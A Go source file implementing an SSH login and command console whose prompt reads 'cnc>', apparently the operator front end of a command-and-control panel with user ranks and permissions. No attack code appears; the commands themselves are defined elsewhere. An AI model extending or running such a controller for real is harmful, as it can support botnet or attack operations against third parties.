package core

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync"

	"golang.org/x/crypto/ssh"
)

type Session struct {
	ID   int
	User *User
	Conn io.ReadWriteCloser
	IP   string
}

var (
	sessionMu sync.RWMutex
	sessions  = map[int]*Session{}
	sessionID int
)

func newSession(u *User, c io.ReadWriteCloser, ip string) *Session {
	sessionMu.Lock()
	defer sessionMu.Unlock()
	sessionID++
	s := &Session{ID: sessionID, User: u, Conn: c, IP: ip}
	sessions[s.ID] = s
	return s
}

func removeSession(id int) {
	sessionMu.Lock()
	defer sessionMu.Unlock()
	delete(sessions, id)
}

func SessionCount() int {
	sessionMu.RLock()
	defer sessionMu.RUnlock()
	return len(sessions)
}

func AllSessions() []*Session {
	sessionMu.RLock()
	defer sessionMu.RUnlock()
	out := make([]*Session, 0, len(sessions))
	for _, s := range sessions {
		out = append(out, s)
	}
	return out
}

func StartSSH(host string, port int, keyFile string) error {
	cfg := &ssh.ServerConfig{NoClientAuth: true}

	key, err := loadKey(keyFile)
	if err != nil {
		return err
	}
	cfg.AddHostKey(key)

	addr := fmt.Sprintf("%s:%d", host, port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}

	log.Printf("[SSH] Listening on %s", addr)

	for {
		c, err := ln.Accept()
		if err != nil {
			log.Printf("[SSH] accept: %s", err)
			continue
		}
		go serve(cfg, c)
	}
}

func serve(cfg *ssh.ServerConfig, nc net.Conn) {
	defer nc.Close()

	sc, chans, reqs, err := ssh.NewServerConn(nc, cfg)
	if err != nil {
		return
	}
	defer sc.Close()

	go ssh.DiscardRequests(reqs)

	for nch := range chans {
		if nch.ChannelType() != "session" {
			nch.Reject(ssh.UnknownChannelType, "unknown")
			continue
		}
		ch, rqs, err := nch.Accept()
		if err != nil {
			return
		}
		go handleChannel(rqs, sc, ch)
	}
}

func handleChannel(reqs <-chan *ssh.Request, sc *ssh.ServerConn, ch ssh.Channel) {
	started := false
	for r := range reqs {
		switch r.Type {
		case "pty-req", "shell":
			if r.WantReply {
				r.Reply(true, nil)
			}
			if !started {
				started = true
				go runSession(ch, sc.RemoteAddr().String())
			}
		case "window-change":
			if r.WantReply {
				r.Reply(true, nil)
			}
		default:
			if r.WantReply {
				r.Reply(false, nil)
			}
		}
	}
}

func loadKey(path string) (ssh.Signer, error) {
	if data, err := os.ReadFile(path); err == nil {
		if s, err := ssh.ParsePrivateKey(data); err == nil {
			return s, nil
		}
	}

	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return nil, err
	}
	pb, err := ssh.MarshalPrivateKey(priv, "")
	if err != nil {
		return nil, err
	}
	data := pem.EncodeToMemory(pb)
	os.WriteFile(path, data, 0600)
	log.Printf("[SSH] Generated host key at %s", path)
	return ssh.ParsePrivateKey(data)
}

func runSession(ch io.ReadWriteCloser, ip string) {
	defer ch.Close()
	defer func() { _ = recover() }()

	u, err := login(ch)
	if err != nil || u == nil {
		return
	}

	s := newSession(u, ch, ip)
	defer removeSession(s.ID)

	log.Printf("[+] %s @ %s (#%d)", u.Username, ip, s.ID)

	drawHome(ch, u)
	prompt(s)

	log.Printf("[-] %s disconnected (#%d)", u.Username, s.ID)
}

func drawBanner(w io.Writer) {
	for _, line := range banner {
		fmt.Fprintf(w, "%s%s%s\r\n", Cyan, line, Reset)
	}
}

func drawLogin(w io.Writer) {
	w.Write([]byte(Clear))
	fmt.Fprintln(w)
	drawBanner(w)
	fmt.Fprintln(w)
	fmt.Fprintf(w, "  %s%s┌─ Authentication ──────────────────────────────────────┐%s\r\n", DGray, Bold, Reset)
	fmt.Fprintf(w, "  %s│%s  Please log in to continue.                            %s│%s\r\n", DGray, Gray, DGray, Reset)
	fmt.Fprintf(w, "  %s└────────────────────────────────────────────────────────┘%s\r\n", DGray, Reset)
	fmt.Fprintln(w)
}

func drawHome(w io.Writer, u *User) {
	w.Write([]byte(Clear))
	fmt.Fprintln(w)
	drawBanner(w)
	fmt.Fprintln(w)
	fmt.Fprintf(w, "  %s%s● Connected as %s%s%s  %s(%s)%s\r\n",
		Green, Bold, White, u.Username, Reset, Gray, u.Rank, Reset)
	fmt.Fprintf(w, "  %sType %s%shelp%s%s for a list of commands.%s\r\n",
		Gray, Cyan, Bold, Reset, Gray, Reset)
	fmt.Fprintln(w)
	fmt.Fprintf(w, "  %s%s%s\r\n", DGray, strings.Repeat("─", 60), Reset)
	fmt.Fprintln(w)
}

func login(rw io.ReadWriteCloser) (*User, error) {
	drawLogin(rw)

	for i := 0; i < 3; i++ {
		fmt.Fprintf(rw, "  %s%s>%s %sUsername:%s ", Cyan, Bold, Reset, White, Reset)
		name, err := readLine(rw, false)
		if err != nil {
			return nil, err
		}
		name = strings.TrimSpace(name)
		if name == "" {
			continue
		}

		fmt.Fprintf(rw, "  %s%s>%s %sPassword:%s ", Cyan, Bold, Reset, White, Reset)
		pass, err := readLine(rw, true)
		if err != nil {
			return nil, err
		}
		pass = strings.TrimSpace(pass)

		u, err := Auth(name, pass)
		if err != nil {
			fmt.Fprintf(rw, "\r\n  %s%s✗%s %sInvalid credentials.%s\r\n\r\n",
				Red, Bold, Reset, Red, Reset)
			continue
		}
		fmt.Fprintf(rw, "\r\n  %s%s✓%s %sLogin successful.%s\r\n",
			Green, Bold, Reset, Green, Reset)
		return u, nil
	}

	fmt.Fprintf(rw, "\r\n  %s%s✗ Too many failed attempts.%s\r\n", Red, Bold, Reset)
	return nil, fmt.Errorf("auth failed")
}

func prompt(s *Session) {
	for {
		fmt.Fprintf(s.Conn, "%s%s%s%s@%s%scnc%s%s>%s ",
			Magenta, Bold, s.User.Username, Reset,
			Cyan, Bold, Reset, White, Reset)

		line, err := readLine(s.Conn, false)
		if err != nil {
			return
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		args := strings.Fields(line)
		if strings.EqualFold(args[0], "clear") || strings.EqualFold(args[0], "cls") {
			drawHome(s.Conn, s.User)
			continue
		}

		if err := Run(s, args); err != nil {
			switch err {
			case ErrUnknownCmd:
				fmt.Fprintf(s.Conn, "  %s%s✗%s %sUnknown command:%s %s%s%s\r\n",
					Red, Bold, Reset, Gray, Reset, White, args[0], Reset)
			case ErrNoPerm:
				fmt.Fprintf(s.Conn, "  %s%s✗%s %sPermission denied.%s\r\n",
					Red, Bold, Reset, Red, Reset)
			default:
				fmt.Fprintf(s.Conn, "  %s%s✗%s %sError:%s %s\r\n",
					Red, Bold, Reset, Red, Reset, err)
			}
		}
	}
}

func readLine(rw io.ReadWriteCloser, mask bool) (string, error) {
	var buf []byte
	one := make([]byte, 1)
	for {
		n, err := rw.Read(one)
		if err != nil {
			return "", err
		}
		if n == 0 {
			continue
		}
		c := one[0]
		switch {
		case c == '\r' || c == '\n':
			rw.Write([]byte("\r\n"))
			return string(buf), nil
		case c == 0x7f || c == 0x08:
			if len(buf) > 0 {
				buf = buf[:len(buf)-1]
				rw.Write([]byte("\b \b"))
			}
		case c == 0x03:
			rw.Write([]byte("^C\r\n"))
			return "", fmt.Errorf("interrupted")
		case c == 0x04:
			if len(buf) == 0 {
				return "", io.EOF
			}
		case c >= 0x20 && c < 0x7f:
			buf = append(buf, c)
			if mask {
				rw.Write([]byte("*"))
			} else {
				rw.Write([]byte{c})
			}
		}
	}
}
